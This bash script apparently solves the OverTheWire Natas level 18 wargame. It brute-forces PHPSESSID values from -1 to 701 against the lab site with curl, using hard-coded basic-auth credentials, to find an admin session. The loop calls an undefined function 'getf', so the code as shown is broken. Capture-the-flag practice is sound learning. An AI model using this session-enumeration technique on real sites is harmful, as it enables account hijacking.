#!/bin/bash

get() { # $1: cookie to supply; $2: "login" to supply user/password
	local creds=""
	if [ "$2" = "login" ] ; then creds="&username=admin&password=admi" ; fi
	curl -Gs -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP "http://natas18.natas.labs.overthewire.org/?debug=tru$creds" --cookie "$1" | sed -z 's/.*<div id="content">\(.*\)<div id="viewsource">.*<\/html>/\1/' | tr "\n\r\t" " "
}

getid() { # $1: session ID to provide; $2: "login" to supply user/pass
	get "PHPSESSID=$1" "$2"
	echo
}

testids() {
	for i in {-1..701}
	do
#		echo -n "$i" >> log
		echo -ne "$i\t" >> log
		getf "$i" >> log
		echo >> log
	done
}

